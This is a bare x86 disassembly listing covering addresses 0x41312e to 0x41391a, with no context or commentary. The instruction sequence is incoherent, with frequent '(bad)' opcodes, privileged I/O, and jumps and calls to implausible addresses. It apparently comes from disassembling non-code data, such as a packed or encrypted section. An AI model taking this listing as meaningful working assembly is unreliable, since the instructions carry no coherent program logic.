  41312e:	fnstenv [edx+0x1eebebef]
  413134:	add    ecx,ecx
  413136:	cld    
  413137:	(bad)  
  413138:	sbb    bl,bl
  41313a:	and    esp,DWORD PTR [edx]
  41313c:	adc    bh,al
  41313e:	lods   al,BYTE PTR ds:[esi]
  41313f:	jne    0x41312f
  413141:	popa   
  413142:	cmp    dl,dl
  413144:	mov    ebp,0x39631380
  413149:	ins    DWORD PTR es:[edi],dx
  41314a:	cmp    ecx,ebx
  41314c:	pushf  
  41314d:	out    0x29,eax
  41314f:	push   ds
  413150:	xchg   edi,eax
  413151:	xchg   ecx,eax
  413152:	out    dx,eax
  413153:	dec    edi
  413154:	loopne 0x413155
  413156:	pop    ds
  413157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413158:	dec    edx
  413159:	cwde   
  41315a:	sub    BYTE PTR [edi],ch
  41315c:	and    DWORD PTR [ebx+0x3f],esi
  41315f:	sub    BYTE PTR [esp+eiz*4-0x2f34ce1e],dl
  413166:	and    eax,0x88d6cd15
  41316b:	scas   al,BYTE PTR es:[edi]
  41316c:	dec    ebp
  41316d:	xchg   edx,eax
  41316e:	adc    bh,BYTE PTR [ebp-0x29af51dd]
  413174:	gs pop es
  413176:	dec    edi
  413177:	daa    
  413178:	mov    fs,WORD PTR [esp+ebp*8+0x57]
  41317c:	mov    al,0x6a
  41317e:	and    eax,DWORD PTR [eax+0xeabf40b]
  413184:	xor    eax,0x9190259d
  413189:	sbb    al,0x2f
  41318b:	adc    BYTE PTR [ecx+0x45],bh
  41318e:	jns    0x41319c
  413190:	add    eax,0x4b353a95
  413195:	popa   
  413196:	inc    edx
  413197:	xchg   ecx,eax
  413198:	mov    ds:0xd32e278e,eax
  41319d:	sbb    eax,0xffcb0fa6
  4131a2:	test   BYTE PTR ds:[edx+0x71f685c2],bh
  4131a9:	push   0x4d
  4131ab:	js     0x413174
  4131ad:	jnp    0x4131a2
  4131af:	dec    esp
  4131b0:	ja     0x4131de
  4131b2:	mov    bh,0xc8
  4131b4:	sub    al,0xc2
  4131b6:	cmp    al,0x94
  4131b8:	loope  0x41320d
  4131ba:	mov    dl,0x65
  4131bc:	jo     0x4131c6
  4131be:	mov    WORD PTR [ebp+0x4f],?
  4131c1:	sbb    DWORD PTR [edx],0x856072d3
  4131c7:	dec    eax
  4131c8:	add    BYTE PTR [ebx+0x1e9d8086],bl
  4131ce:	push   0x7bbceff2
  4131d3:	out    dx,al
  4131d4:	dec    edx
  4131d5:	icebp  
  4131d6:	fistp  DWORD PTR [edx-0x72d14b33]
  4131dc:	sub    BYTE PTR [edx],ch
  4131de:	je     0x413182
  4131e0:	push   cs
  4131e1:	cmp    eax,0x40beb44b
  4131e6:	fmul   QWORD PTR [edi]
  4131e8:	cmp    BYTE PTR [eax+0x4c],bh
  4131eb:	inc    edi
  4131ec:	mov    bh,0xa3
  4131ee:	jo     0x41318f
  4131f0:	add    cl,al
  4131f2:	jns    0x4131a1
  4131f4:	push   ebx
  4131f5:	call   0x1534f2a
  4131fa:	and    ah,BYTE PTR [ebp-0x1946baae]
  413200:	jo     0x413249
  413202:	hlt    
  413203:	sbb    al,0x59
  413205:	add    eax,DWORD PTR [edx-0x7f7332aa]
  41320b:	add    BYTE PTR [esi+0x2746502a],bh
  413211:	mov    ch,0xbd
  413213:	fnop   
  413215:	add    eax,0xbe6a2b62
  41321a:	fisttp DWORD PTR [eax+0x7a61f6a0]
  413220:	(bad)  
  413221:	int3   
  413222:	mov    esi,0x9747a868
  413227:	in     eax,0xa5
  413229:	ds dec ebp
  41322b:	lods   al,BYTE PTR ds:[esi]
  41322c:	loope  0x4131c4
  41322e:	daa    
  41322f:	int3   
  413230:	mov    al,ds:0x4dbb4bb6
  413235:	sub    esp,esp
  413237:	inc    ecx
  413238:	pop    ecx
  413239:	or     DWORD PTR [edi+0x113fa36e],edi
  41323f:	jg     0x413294
  413241:	pusha  
  413242:	mov    edx,0xb8470a16
  413247:	jg     0x41328d
  413249:	stc    
  41324a:	outs   dx,DWORD PTR ds:[esi]
  41324b:	cmp    edx,DWORD PTR [esp+eiz*2+0x1c31e18d]
  413252:	or     BYTE PTR [ebx-0x1127fea3],0xc
  413259:	jnp    0x413210
  41325b:	add    ecx,esp
  41325d:	sub    ebp,ecx
  41325f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413260:	aad    0xd8
  413262:	push   eax
  413263:	push   edi
  413264:	fstenv [edi+0x67ae4be0]
  41326b:	jge    0x413255
  41326d:	jno    0x4132bf
  41326f:	out    0x93,eax
  413271:	xor    dl,0x9d
  413274:	cmc    
  413275:	mov    al,0xbc
  413277:	scas   al,BYTE PTR es:[edi]
  413278:	cmp    BYTE PTR [edi+edi*1],al
  41327b:	rcl    BYTE PTR [edx-0x45],1
  41327e:	int3   
  41327f:	fnstsw WORD PTR [edi+0x7]
  413282:	les    ebx,FWORD PTR [ebp-0x56]
  413285:	push   esp
  413286:	inc    ebp
  413287:	dec    ecx
  413288:	test   ecx,0x2cc9ac6b
  41328e:	add    dh,bl
  413290:	sub    al,0x77
  413292:	xchg   ebx,eax
  413293:	frstor [edx+esi*8-0x602fedc6]
  41329a:	js     0x41330b
  41329c:	push   edi
  41329d:	aas    
  41329e:	stos   DWORD PTR es:[edi],eax
  41329f:	hlt    
  4132a0:	fisubr WORD PTR [esi-0x39893366]
  4132a6:	mov    al,ds:0xa954346c
  4132ab:	(bad)  
  4132ac:	mov    eax,0xf9cd7a29
  4132b1:	shr    BYTE PTR [eax+edi*2+0x3d0258ce],1
  4132b8:	imul   eax,esp,0xe
  4132bb:	jbe    0x413255
  4132bd:	lock out 0x9c,al
  4132c0:	add    al,0x51
  4132c2:	push   esp
  4132c3:	adc    al,0x81
  4132c5:	dec    edi
  4132c6:	idiv   BYTE PTR [eax]
  4132c8:	inc    edi
  4132c9:	imul   DWORD PTR [esi+0x2f]
  4132cc:	aaa    
  4132cd:	pusha  
  4132ce:	jns    0x4132f3
  4132d0:	adc    dh,al
  4132d2:	popa   
  4132d3:	jecxz  0x41334d
  4132d5:	cli    
  4132d6:	jl     0x41329d
  4132d8:	jmp    0x413344
  4132da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132db:	cmp    DWORD PTR [edx-0x23f3533e],esp
  4132e1:	lods   al,BYTE PTR ds:[esi]
  4132e2:	cmp    eax,0x7a069d60
  4132e7:	out    dx,eax
  4132e8:	imul   ecx,DWORD PTR [edi-0x7],0x917043a5
  4132ef:	arpl   WORD PTR [edi+0xd4bcd1f],cx
  4132f5:	cmp    BYTE PTR [edi+0x77],bl
  4132f8:	fwait
  4132f9:	loop   0x413357
  4132fb:	mov    edx,0xb4809b87
  413300:	push   ecx
  413301:	push   ds
  413302:	ss out dx,eax
  413304:	xor    bh,dl
  413306:	in     al,0xaa
  413308:	ficomp WORD PTR [ebx+0x36]
  41330b:	push   edx
  41330c:	adc    eax,0xfd3df84e
  413311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413312:	call   0x6e6a8e74
  413317:	gs cld 
  413319:	mov    eax,0xefc740d6
  41331e:	mov    bl,0x6e
  413320:	lods   al,BYTE PTR ds:[esi]
  413321:	push   ecx
  413322:	push   esp
  413323:	in     eax,0x53
  413325:	xchg   edx,eax
  413326:	xchg   DWORD PTR [ebx],esi
  413328:	test   al,0x3
  41332a:	inc    eax
  41332b:	pop    ss
  41332c:	aam    0x6a
  41332e:	out    0x48,al
  413330:	call   0xe76:0x2c576d68
  413337:	inc    edi
  413338:	add    BYTE PTR [eiz*1-0x434c0f5e],ch
  41333f:	xor    BYTE PTR fs:[esi+0x242a69ee],bl
  413346:	xor    al,0xd6
  413348:	push   edx
  413349:	xchg   esp,eax
  41334a:	mov    al,0xea
  41334c:	jl     0x4132f3
  41334e:	int3   
  41334f:	adc    DWORD PTR [edx+0x2e],ecx
  413352:	xchg   ebx,eax
  413353:	ret    0x7f34
  413356:	cli    
  413357:	jb     0x4132e0
  413359:	mov    bl,0x9b
  41335b:	outs   dx,DWORD PTR ds:[esi]
  41335c:	loop   0x41331a
  41335e:	mov    dh,BYTE PTR [edi-0x1eae64d3]
  413364:	pop    edi
  413365:	mov    ah,0xa2
  413367:	es mov eax,0xacb23587
  41336d:	jmp    0x413315
  41336f:	push   0x31
  413371:	xchg   ecx,eax
  413372:	mov    DWORD PTR [edi+0x6],eax
  413375:	lahf   
  413376:	pop    edi
  413377:	int3   
  413378:	mov    ds:0xc644c7b3,eax
  41337d:	rcr    DWORD PTR [edi+0x6ad4c330],cl
  413383:	xchg   edx,eax
  413384:	(bad)  
  413386:	cmp    edx,esp
  413388:	jmp    0x413312
  41338a:	xchg   ebx,eax
  41338b:	fisttp QWORD PTR [ecx]
  41338d:	pushf  
  41338e:	out    dx,eax
  41338f:	push   edi
  413390:	arpl   WORD PTR [esi+edi*4-0x544fca52],bx
  413397:	pushf  
  413398:	fldcw  WORD PTR [ebx-0x3]
  41339b:	sub    bh,BYTE PTR [ebx+0x36588769]
  4133a1:	mov    DWORD PTR [si+0x69e4],esp
  4133a6:	(bad)  
  4133a8:	aad    0xc4
  4133aa:	inc    esi
  4133ab:	sbb    BYTE PTR [esi],bl
  4133ad:	not    bh
  4133af:	std    
  4133b0:	xor    al,0xcd
  4133b2:	js     0x4133b8
  4133b4:	test   DWORD PTR [ecx-0x57],esi
  4133b7:	lods   eax,DWORD PTR ds:[esi]
  4133b8:	inc    ecx
  4133b9:	xor    DWORD PTR [ebx+0x35],0x46ca01a5
  4133c0:	test   ah,0xbb
  4133c3:	daa    
  4133c4:	and    al,0x85
  4133c6:	push   ebp
  4133c7:	mov    eax,ds:0xe56dd228
  4133cc:	inc    eax
  4133cd:	sti    
  4133ce:	iret   
  4133cf:	or     eax,esi
  4133d1:	push   eax
  4133d2:	and    BYTE PTR [ebp+0x57],0xc5
  4133d6:	je     0x41339a
  4133d8:	jae    0x41341d
  4133da:	imul   ebp,DWORD PTR [ebx-0x55],0xf03fc172
  4133e1:	scas   eax,DWORD PTR es:[edi]
  4133e2:	outs   dx,DWORD PTR ds:[esi]
  4133e3:	mov    edx,0x84ac20c1
  4133e8:	(bad)  
  4133e9:	aam    0x86
  4133eb:	dec    edx
  4133ec:	push   ecx
  4133ed:	ficomp DWORD PTR [edx-0x77]
  4133f0:	xor    BYTE PTR [esi],cl
  4133f2:	mov    DWORD PTR [esi-0x58a52797],0x8b04ca06
  4133fc:	mov    edx,DWORD PTR [ebx]
  4133fe:	fidiv  WORD PTR [ebp+0x2018f691]
  413404:	shl    BYTE PTR [eax],1
  413406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413407:	pop    ds
  413408:	sar    DWORD PTR [ecx+0x72751bb8],cl
  41340e:	outs   dx,BYTE PTR ds:[esi]
  41340f:	mov    DWORD PTR [ebp-0x6d0af30d],ecx
  413415:	es pop eax
  413417:	push   cs
  413418:	adc    DWORD PTR gs:[edi+0x52],0xb39be118
  413420:	xchg   edi,eax
  413421:	scas   al,BYTE PTR es:[edi]
  413422:	and    DWORD PTR [edi+eax*1-0x31],esi
  413426:	pop    ss
  413427:	fstp   QWORD PTR [edi-0xb]
  41342a:	(bad)  
  41342b:	rcl    DWORD PTR [edi+edx*2],cl
  41342e:	ficom  DWORD PTR [edi+0x1cece4ad]
  413434:	adc    cl,cl
  413436:	lods   eax,DWORD PTR ds:[esi]
  413437:	xchg   edi,eax
  413438:	xchg   ebx,ebp
  41343a:	add    esp,ecx
  41343c:	mov    eax,0xe2b7d673
  413441:	sti    
  413442:	push   cs
  413443:	sbb    DWORD PTR [eax-0x18],edx
  413446:	ret    
  413447:	das    
  413448:	hlt    
  413449:	push   ebx
  41344a:	sar    DWORD PTR [eax],cl
  41344c:	xchg   ecx,eax
  41344d:	mov    ebp,0xa2c90a4a
  413452:	mov    bh,0xcf
  413454:	mov    edi,0xc8c25fed
  413459:	jmp    0xecc0:0xfdfdbd92
  413460:	addr16 aas 
  413462:	sub    al,0x6f
  413464:	push   ecx
  413465:	adc    eax,0xfd9b2733
  41346a:	add    esp,ebp
  41346c:	shr    ebp,0xfd
  41346f:	xlat   BYTE PTR ds:[ebx]
  413470:	xchg   esi,eax
  413471:	pushf  
  413472:	xor    bl,al
  413474:	mov    ds:0x2b236f42,al
  413479:	xchg   esp,eax
  41347a:	push   edx
  41347b:	lods   eax,DWORD PTR ds:[esi]
  41347c:	mov    ebp,0x240a0388
  413481:	xor    edx,DWORD PTR [eax]
  413483:	into   
  413484:	mov    bh,0x74
  413486:	addr16 out dx,eax
  413488:	pop    ecx
  413489:	ss jnp 0x413410
  41348c:	xchg   edi,eax
  41348d:	mov    cl,0x56
  41348f:	sub    eax,0x557af886
  413494:	dec    esi
  413495:	sub    DWORD PTR [eax+edi*1-0x3c64a3ed],ecx
  41349c:	mov    ds:0x3a19a137,al
  4134a1:	sbb    bh,BYTE PTR [eax+0x629fdcee]
  4134a7:	pop    edx
  4134a8:	int    0xb6
  4134aa:	ins    DWORD PTR es:[edi],dx
  4134ab:	jne    0x4134ce
  4134ad:	or     al,BYTE PTR [edx+edi*8+0x5873aa96]
  4134b4:	(bad)  
  4134b5:	aaa    
  4134b6:	fdivr  QWORD PTR [ebp+ecx*2-0x4e]
  4134ba:	loop   0x413529
  4134bc:	fldcw  WORD PTR [edi-0x38]
  4134bf:	scas   al,BYTE PTR es:[edi]
  4134c0:	mov    al,ds:0xeca90ee3
  4134c5:	ja     0x413507
  4134c7:	sbb    DWORD PTR ds:0x43d46be0,ebp
  4134cd:	popf   
  4134ce:	xlat   BYTE PTR gs:[ebx]
  4134d0:	adc    bl,ah
  4134d2:	cmp    eax,0xd048eb09
  4134d7:	xchg   ecx,eax
  4134d8:	add    eax,0xe937f130
  4134dd:	fadd   st,st(3)
  4134df:	adc    al,0x1f
  4134e1:	dec    ebx
  4134e2:	sub    cl,BYTE PTR [eax-0x7f]
  4134e5:	scas   eax,DWORD PTR es:[edi]
  4134e6:	les    ebx,FWORD PTR [ecx-0xd375ede]
  4134ec:	ss enter 0x6dc8,0x33
  4134f1:	shr    cl,cl
  4134f3:	xlat   BYTE PTR ds:[ebx]
  4134f4:	adc    DWORD PTR [ebp-0x56341314],eax
  4134fa:	mov    dl,0x45
  4134fc:	push   esi
  4134fd:	outs   dx,BYTE PTR ds:[esi]
  4134fe:	sub    eax,0xc3f098aa
  413503:	sub    cl,BYTE PTR [edx-0x705d42d5]
  413509:	pop    ds
  41350a:	fisub  DWORD PTR es:[edx-0x6b]
  41350e:	jecxz  0x413504
  413510:	(bad)  
  413511:	lods   eax,DWORD PTR ds:[esi]
  413512:	jae    0xafa08aaf
  413518:	cmp    ebx,DWORD PTR [ecx]
  41351a:	inc    ebp
  41351b:	mov    WORD PTR [edi-0x4789535f],?
  413521:	xchg   esp,eax
  413522:	loopne 0x413567
  413524:	nop
  413525:	jle    0x4134df
  413527:	mov    al,ch
  413529:	inc    ebp
  41352a:	jl     0x41356b
  41352c:	xchg   BYTE PTR [ebp+0x26],cl
  41352f:	imul   ebp,DWORD PTR [eax-0x1f],0x72
  413533:	mov    cl,0x77
  413535:	jmp    0xe5290e56
  41353a:	xor    ebx,esp
  41353c:	imul   esp,ebx,0x4b
  41353f:	ror    BYTE PTR [ecx],1
  413541:	ss nop
  413543:	inc    edx
  413544:	aam    0x28
  413546:	lock inc edx
  413548:	cld    
  413549:	xchg   DWORD PTR [edx+ecx*2],ecx
  41354c:	sbb    ecx,DWORD PTR [eax]
  41354e:	mov    cl,BYTE PTR [ecx+0x52c8b127]
  413554:	int    0xf6
  413556:	addr16 sti 
  413558:	pushf  
  413559:	arpl   bp,bp
  41355b:	cdq    
  41355c:	push   es
  41355d:	ja     0x4135b0
  41355f:	push   ds
  413560:	out    0x2,eax
  413562:	shr    BYTE PTR [edx-0x59ce7638],0x3e
  413569:	les    esi,FWORD PTR [ecx]
  41356b:	mov    al,ds:0x535ae0e5
  413570:	adc    DWORD PTR [esi+esi*2-0x29],eax
  413574:	call   0x9e1fe68f
  413579:	xor    DWORD PTR [edx-0x75],esi
  41357c:	cmc    
  41357d:	clc    
  41357e:	in     al,dx
  41357f:	pop    ebx
  413580:	in     al,0xc6
  413582:	pop    edx
  413583:	gs jb  0x4135e3
  413586:	lods   al,BYTE PTR ds:[esi]
  413587:	enter  0xd214,0xe6
  41358b:	cs jne 0x413559
  41358e:	inc    edi
  41358f:	push   es
  413590:	push   edx
  413591:	push   ebx
  413592:	mov    dl,0x69
  413594:	imul   ebx,esi,0xffffff87
  413597:	mov    ?,ecx
  413599:	xlat   BYTE PTR ds:[ebx]
  41359a:	xchg   ebp,eax
  41359b:	fimul  WORD PTR [ebx-0x5e]
  41359e:	lock data16 mov WORD PTR [eax],ds
  4135a2:	mov    ebx,0x14817581
  4135a7:	xadd   DWORD PTR [edi+0x4bb9910a],edx
  4135ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135af:	push   ebx
  4135b0:	pop    edx
  4135b1:	fld    DWORD PTR [ebx*1+0x3d851aec]
  4135b8:	sbb    eax,DWORD PTR [ebx+0x43fe412b]
  4135be:	gs mov ebp,0x91bfeddd
  4135c4:	in     al,dx
  4135c5:	std    
  4135c6:	ror    DWORD PTR [ebx-0x7c],1
  4135c9:	je     0x4135d0
  4135cb:	fldenv ds:0xf897cf1f
  4135d1:	int3   
  4135d2:	inc    eax
  4135d3:	imul   edi,DWORD PTR [edx+0x6],0x8c833c56
  4135da:	mov    eax,0xf4b3289c
  4135df:	adc    BYTE PTR [eax],al
  4135e1:	mov    BYTE PTR cs:[edx+0x19],al
  4135e5:	jne    0x413570
  4135e7:	pop    ebx
  4135e8:	loop   0x4135f3
  4135ea:	jge    0x4135fd
  4135ec:	inc    ebp
  4135ed:	or     cl,BYTE PTR [ecx+0x5f0e1260]
  4135f3:	mov    ebp,0xbe19216b
  4135f8:	setp   BYTE PTR [ecx-0x1e]
  4135fc:	or     BYTE PTR [edi+eiz*2+0x19a6e5e1],0x85
  413604:	or     eax,0x17001023
  413609:	xchg   ebx,eax
  41360b:	jnp    0x4135f0
  41360d:	jbe    0x4135bf
  41360f:	or     ch,dl
  413611:	jp     0x41362c
  413613:	mov    ah,0x7b
  413615:	adc    edx,eax
  413617:	fcom   DWORD PTR ds:0xd14c2673
  41361d:	mov    eax,ds:0x8c420246
  413622:	(bad)  
  413623:	lods   eax,DWORD PTR ds:[esi]
  413624:	xchg   esp,eax
  413625:	pop    eax
  413626:	or     BYTE PTR [ecx],0x24
  413629:	dec    edx
  41362a:	shr    DWORD PTR [edi-0x2d],0xf6
  41362e:	and    DWORD PTR [ebx],ebx
  413630:	out    dx,al
  413631:	lds    eax,FWORD PTR [ecx]
  413633:	test   al,0xbc
  413635:	into   
  413636:	stos   BYTE PTR es:[edi],al
  413637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413638:	pop    edx
  413639:	fcmovnb st,st(2)
  41363b:	jae    0x413656
  41363d:	mov    dl,0x71
  41363f:	mov    eax,ds:0x57dc85e2
  413644:	jp     0x41365c
  413646:	push   DWORD PTR [ebx]
  413648:	pop    ss
  413649:	adc    BYTE PTR [esi+0x41],al
  41364c:	jmp    0xc1b3:0x720e0911
  413653:	in     al,dx
  413654:	dec    esi
  413655:	jg     0x4135f7
  413657:	pop    edx
  413658:	imul   BYTE PTR [esi-0x5b39dcd3]
  41365e:	sub    edx,DWORD PTR [ebx+eax*4-0x16]
  413662:	or     BYTE PTR [ecx-0x25590078],ah
  413668:	lods   eax,DWORD PTR ds:[esi]
  413669:	popf   
  41366a:	js     0x4136c1
  41366c:	fwait
  41366d:	adc    BYTE PTR [ecx],dh
  41366f:	add    eax,0x732ddab3
  413674:	lds    esi,FWORD PTR [ecx+0xb]
  413677:	jno    0x4136d6
  413679:	pusha  
  41367a:	jmp    esi
  41367c:	adc    al,0xec
  41367e:	add    ebp,DWORD PTR [edx]
  413680:	neg    DWORD PTR [edi-0x54]
  413683:	sahf   
  413684:	sub    ebx,ebp
  413686:	sbb    al,0x68
  413688:	pop    ss
  413689:	mov    dh,0x14
  41368b:	jle    0x413660
  41368d:	jns    0x4136e8
  41368f:	lock mov ds:0x9e45f707,al
  413695:	fidivr DWORD PTR [eax+0x5f]
  413698:	lods   al,BYTE PTR ds:[esi]
  413699:	mov    ds:0xee6637bd,al
  41369e:	cmp    al,0x42
  4136a0:	xor    eax,0xd22348a6
  4136a5:	jecxz  0x413658
  4136a7:	fabs   
  4136a9:	or     al,0x70
  4136ab:	test   BYTE PTR ds:0x731806e4,0x62
  4136b2:	arpl   WORD PTR [ecx-0x155728bb],ax
  4136b8:	sahf   
  4136b9:	aad    0xbb
  4136bb:	pushf  
  4136bc:	push   edi
  4136bd:	mov    esp,0x8458237b
  4136c2:	mov    ds:0xa96391c8,al
  4136c7:	pop    edx
  4136c8:	inc    ebx
  4136c9:	aaa    
  4136ca:	es dec edx
  4136cc:	mov    cl,0xb2
  4136ce:	mov    ds:0xb0123850,al
  4136d3:	daa    
  4136d4:	pop    ds
  4136d5:	push   cs
  4136d6:	js     0x41368b
  4136d8:	lds    esi,FWORD PTR [ecx+0x39]
  4136db:	loopne 0x4136df
  4136dd:	xchg   ebp,eax
  4136de:	and    eax,0x99ed3e67
  4136e3:	(bad)  
  4136e4:	scas   eax,DWORD PTR es:[edi]
  4136e5:	cmc    
  4136e6:	das    
  4136e7:	mov    BYTE PTR ds:[ebx+0x9c9a071],cl
  4136ee:	pop    edi
  4136ef:	popa   
  4136f0:	addr16 jmp 0xde4a:0x43c47346
  4136f8:	mov    WORD PTR [esi-0x72],ss
  4136fb:	adc    bl,BYTE PTR [eax-0xd9a692e]
  413701:	pop    eax
  413702:	xchg   esi,eax
  413703:	dec    ebx
  413704:	fs sti 
  413706:	pushf  
  413707:	(bad)  
  413708:	jecxz  0x41372f
  41370a:	xchg   DWORD PTR [eax-0x72],esi
  41370d:	pushf  
  41370e:	sub    edi,DWORD PTR [edx+0x7401f52d]
  413714:	and    BYTE PTR [ebx],dh
  413716:	loopne 0x413702
  413718:	mov    bh,0x48
  41371a:	jns    0x4136b0
  41371c:	xchg   edx,eax
  41371d:	lock loopne 0x413725
  413720:	adc    ebp,DWORD PTR [ebx-0x5e]
  413723:	outs   dx,BYTE PTR ds:[esi]
  413724:	sub    al,0x2a
  413726:	test   DWORD PTR [ebx+ebx*4-0x5c97e242],0x91e8d251
  413731:	mov    al,0x75
  413733:	push   esi
  413734:	inc    esp
  413735:	nop
  413736:	xlat   BYTE PTR ds:[ebx]
  413737:	(bad)  
  413739:	loopne 0x41373a
  41373b:	dec    edi
  41373c:	inc    esp
  41373d:	test   DWORD PTR [ecx],eax
  41373f:	push   0x6f53a14c
  413744:	fcom   DWORD PTR [eax+ecx*2+0x77386e11]
  41374b:	popa   
  41374c:	sub    eax,0xe6bafdf6
  413751:	jne    0x41378c
  413753:	outs   dx,DWORD PTR ds:[esi]
  413754:	add    al,BYTE PTR [esi+0x571e44f3]
  41375a:	xchg   esp,eax
  41375b:	ss push ecx
  41375d:	xchg   edx,eax
  41375e:	push   edx
  41375f:	dec    esp
  413760:	dec    eax
  413761:	aam    0x87
  413763:	mov    esp,0x60ca73e6
  413768:	aad    0x2c
  41376a:	push   ecx
  41376b:	repz xchg esi,eax
  41376d:	fsubr  QWORD PTR [eax]
  41376f:	arpl   WORD PTR [eax+ebp*2+0x2741789f],di
  413776:	jns    0x413728
  413778:	es mov esi,0xbcfc4dca
  41377e:	lahf   
  41377f:	adc    al,0x8b
  413781:	out    0x9d,eax
  413783:	test   DWORD PTR [eax],eax
  413785:	or     bh,ch
  413787:	fwait
  413788:	loop   0x4137d5
  41378a:	ss sbb ebp,esi
  41378d:	dec    eax
  41378e:	jo     0x413776
  413790:	push   0x8ba91700
  413795:	mov    ecx,0xb5be71df
  41379a:	jbe    0x413812
  41379c:	mov    esp,0x664ffe60
  4137a1:	and    dl,BYTE PTR [ebp-0x41300bb9]
  4137a7:	inc    ebp
  4137a8:	jo     0x41380c
  4137aa:	outs   dx,BYTE PTR ds:[esi]
  4137ab:	mov    esp,esp
  4137ad:	push   ss
  4137ae:	sbb    ch,0x32
  4137b1:	retf   
  4137b2:	leave  
  4137b3:	gs js  0x413819
  4137b6:	mov    ecx,0xcfca58a3
  4137bb:	dec    edi
  4137bc:	or     BYTE PTR [edi],0x7c
  4137bf:	inc    ebx
  4137c0:	pop    ds
  4137c1:	test   al,0x5e
  4137c3:	dec    ebp
  4137c4:	test   DWORD PTR fs:[ebx+0x776a4ec3],edx
  4137cb:	dec    edx
  4137cc:	inc    edi
  4137cd:	dec    ecx
  4137ce:	ror    BYTE PTR [esi],0x7
  4137d1:	xchg   esp,eax
  4137d2:	xchg   ecx,eax
  4137d3:	and    bl,ah
  4137d5:	sub    al,0xcd
  4137d7:	dec    ecx
  4137d8:	xchg   edi,eax
  4137d9:	xor    ah,al
  4137db:	jmp    0x413789
  4137dd:	mov    ebp,0xdb487ede
  4137e2:	cwde   
  4137e3:	sub    BYTE PTR [ebp+ebx*8-0x446ead96],0x97
  4137eb:	rcl    DWORD PTR [edx-0x2af25d1f],0x5
  4137f2:	sub    DWORD PTR [eax],esi
  4137f4:	popf   
  4137f5:	stos   BYTE PTR es:[edi],al
  4137f6:	data16 mov dh,0x70
  4137f9:	jo     0x413871
  4137fb:	daa    
  4137fc:	test   al,0x2f
  4137fe:	aas    
  4137ff:	sub    al,0xf0
  413801:	cwde   
  413802:	xlat   BYTE PTR ds:[ebx]
  413803:	adc    eax,0xbfb980e1
  413808:	mov    ebx,0x61c6d5ef
  41380d:	jl     0x4137a7
  41380f:	call   0x3cc4832f
  413814:	gs pop ds
  413816:	mov    DWORD PTR [ebx+0x46],eax
  413819:	jns    0x4137dd
  41381b:	push   eax
  41381c:	out    dx,al
  41381d:	outs   dx,BYTE PTR ds:[esi]
  41381e:	sar    BYTE PTR [ebp+0x64c81c82],cl
  413824:	ss repz adc eax,0xa92636d5
  41382b:	lahf   
  41382c:	inc    eax
  41382d:	aad    0xbb
  41382f:	dec    esp
  413830:	nop
  413831:	dec    edx
  413832:	in     eax,dx
  413833:	nop
  413834:	push   0xffffffdf
  413836:	not    BYTE PTR [ebp+ecx*4+0x3a322af2]
  41383d:	je     0x413871
  41383f:	mov    dh,0xe
  413841:	les    edi,FWORD PTR ss:[eax+0x29123640]
  413848:	ins    BYTE PTR es:[edi],dx
  413849:	cmp    dh,BYTE PTR [edi]
  41384b:	jmp    0x41382a
  41384d:	pusha  
  41384e:	cmp    al,0x1d
  413850:	ins    DWORD PTR es:[edi],dx
  413851:	pop    ds
  413852:	mov    ch,0x6c
  413854:	inc    ebp
  413855:	push   cs
  413856:	aaa    
  413857:	and    eax,0x8962d1ac
  41385c:	ds push 0xffffff88
  41385f:	mov    esp,0xfc40aeed
  413864:	xchg   DWORD PTR [eax+eiz*4-0x1],ecx
  413868:	mov    ebx,0x4a8136a3
  41386d:	ja     0x4138b0
  41386f:	addr16 mov al,0x6f
  413872:	sbb    esp,DWORD PTR [edx-0x446942a5]
  413878:	sbb    eax,esp
  41387a:	shl    DWORD PTR [eax+esi*4-0x4e],1
  41387e:	es pop ebx
  413880:	mov    ds:0xd6b48dcd,eax
  413885:	mov    BYTE PTR [edx-0x66cc4b14],dh
  41388b:	mov    fs,WORD PTR [ebp+ecx*2-0x7c]
  41388f:	fpatan 
  413891:	inc    esp
  413892:	pop    es
  413893:	mov    dl,0xf8
  413895:	jp     0x4138a6
  413897:	cmp    DWORD PTR [ebp-0x681ab102],ecx
  41389d:	and    BYTE PTR [edi],0x60
  4138a0:	cwd    
  4138a2:	inc    esp
  4138a3:	stos   DWORD PTR es:[edi],eax
  4138a4:	xchg   ecx,eax
  4138a5:	pop    edi
  4138a6:	out    dx,al
  4138a7:	jl     0x4138bc
  4138a9:	xchg   ebp,eax
  4138aa:	cmp    bh,BYTE PTR [esi-0x50d12acd]
  4138b0:	imul   ebx,DWORD PTR [edx-0x48e4044f],0xffffffe3
  4138b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138b8:	xchg   dl,bh
  4138ba:	mov    bh,0x40
  4138bc:	in     al,dx
  4138bd:	or     edi,DWORD PTR [eax]
  4138bf:	inc    ebp
  4138c0:	mov    WORD PTR [edx],cs
  4138c2:	cmp    ebp,DWORD PTR ds:0x91f827d6
  4138c8:	and    DWORD PTR [ebp-0x11],edx
  4138cb:	or     BYTE PTR [ebx-0x41],ah
  4138ce:	data16 and dl,al
  4138d1:	push   eax
  4138d2:	addr16 pop ebp
  4138d4:	xchg   esp,eax
  4138d5:	sub    BYTE PTR [edx],0xe9
  4138d8:	imul   ebp,DWORD PTR [edx+0x51],0xa6b8767c
  4138df:	(bad)  
  4138e0:	sub    eax,0x713b2048
  4138e5:	inc    edi
  4138e6:	jno    0x4138af
  4138e8:	jecxz  0x4138d0
  4138ea:	ins    BYTE PTR es:[edi],dx
  4138eb:	repz clc 
  4138ed:	push   eax
  4138ee:	daa    
  4138ef:	rcl    DWORD PTR [esi+0x3e],0x9a
  4138f3:	mov    bl,0xad
  4138f5:	add    al,0x3e
  4138f7:	add    ch,bl
  4138f9:	add    ch,BYTE PTR [edx-0x1a6641a1]
  4138ff:	aam    0x5f
  413901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413902:	push   esi
  413903:	dec    ebx
  413904:	test   DWORD PTR [edi-0x4bbfe494],esp
  41390a:	scas   eax,DWORD PTR es:[edi]
  41390b:	ret    0x2391
  41390e:	push   esi
  413910:	test   DWORD PTR [edi-0x10],edi
  413913:	lods   eax,DWORD PTR ds:[esi]
  413914:	cs push 0xfab7aec7
  41391a:	hlt    
